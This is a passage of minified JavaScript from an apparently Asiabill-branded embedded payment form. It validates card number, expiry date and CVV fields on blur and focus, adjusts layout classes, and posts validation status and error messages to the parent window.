                        errorMsg: e.errorMsg,
                        lastEvent: x.event,
                        inputEvent: "blur"
                    }
                };
                x.source.postMessage(a, x.origin)
            });
            break;
        case "pay-cvv":
            let r = $("#" + e);
            f(e, "blur", function() {
                var e = _("getErrorListforCvv");
                var a = {
                    type: "validate",
                    data: {
                        validForm: x.validForm,
                        errorMsg: e.errorMsg,
                        lastEvent: x.event,
                        inputEvent: "blur"
                    }
                };
                x.source.postMessage(a, x.origin)
            });
            f(e, "focus", function() {
                let e = $(".pay-card-wrap");
                let a = $(".asiabill_form-wrap").outerWidth();
                if (a < 400 && x.pageMode == "inner") {
                    if (x.lang == "ar") {
                        e.addClass("pay-card-wrap-transition").addClass("reverse");
                        $(".pay-date-wrap").addClass("pay-card-wrap-transition").addClass("reverse");
                        $(".pay-cvv-wrap").addClass("pay-card-wrap-transition").addClass("reverse")
                    } else {
                        e.addClass("pay-card-wrap-transition");
                        $(".pay-date-wrap").addClass("pay-card-wrap-transition");
                        $(".pay-cvv-wrap").addClass("pay-card-wrap-transition")
                    }
                }
                s(false, r)
            });
            break;
        case "card-type":
            return d;
        case "show-cardImg":
            return a;
        case "init-cardImg":
            return p;
        case "init-cardImg-error":
            return u;
        case "getErrorList":
            var w = $("#pay-card");
            var b = $("#pay-date");
            var C = $("#pay-cvv");
            g(w, w.val());
            y(b, b.val());
            m(C, C.val());
            var k = [].concat(o, l, n);
            if (k.length > 0) {
                x.validForm = false;
                return {
                    errorMsg: k[0]
                }
            } else {
                x.validForm = true
            }
            return {
                errorMsg: ""
            };
            break;
        case "getErrorListforCard":
            var w = $("#pay-card");
            g(w, w.val());
            var k = [].concat(o);
            if (k.length > 0) {
                x.validForm = false;
                return {
                    errorMsg: k[0]
                }
            } else {
                x.validForm = true
            }
            return {
                errorMsg: ""
            };
            break;
        case "getErrorListforDate":
            var b = $("#pay-date");
            y(b, b.val());
            var k = [].concat(l);
            if (k.length > 0) {
                x.validForm = false;
                return {
                    errorMsg: k[0]
                }
            } else {
                x.validForm = true
            }
            return {
                errorMsg: ""
            };
            break;
        case "getErrorListforCvv":
            var C = $("#pay-cvv");
            m(C, C.val());
            var k = [].concat(n);
            if (k.length > 0) {
                x.validForm = false;
                return {
                    errorMsg: k[0]
                }
            } else {
                x.validForm = true
            }
            return {
                errorMsg: ""
            };
            break;
        default:
            break
        }
    }
    a()
}
)();
